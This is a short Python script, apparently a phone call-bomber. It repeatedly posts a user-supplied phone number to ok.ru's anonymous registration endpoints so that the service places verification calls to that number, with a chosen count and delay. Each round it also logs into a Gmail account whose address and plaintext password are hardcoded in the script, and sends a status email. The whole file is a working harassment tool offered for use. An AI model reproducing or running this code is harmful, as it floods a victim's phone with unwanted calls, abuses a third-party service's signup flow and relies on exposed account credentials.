import requests
import time
import smtplib
print("inter number to call:")
i = int(input())
print("How many?:")
j = int(input())
print("how many seconds?")
k = int(input())
for v in range(j):
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login("skes2197@gmail.com", "azerty-834")
    message = "calling " +"+"+str(i) + " pour la " + str(v+1) + "eme fois sur "+str(j)+" pour un laps de"+str(k)+" seconds"
    s.sendmail("hichamotivation@gmail.com", "skes2197@gmail.com", message)
    s.quit()
    print("--------------")

    s = requests.session()
    payload = {'st.r.phone': i}
    response = s.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                      data=payload)
    print(response.status_code)
    payload2 = {'st.r.fieldAcceptCallUIButton': 'Call'}
    response = s.post("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI",
                      data=payload2)
    print(response.status_code, response.reason, str(v+1)+"/"+str(j))
    time.sleep(k)

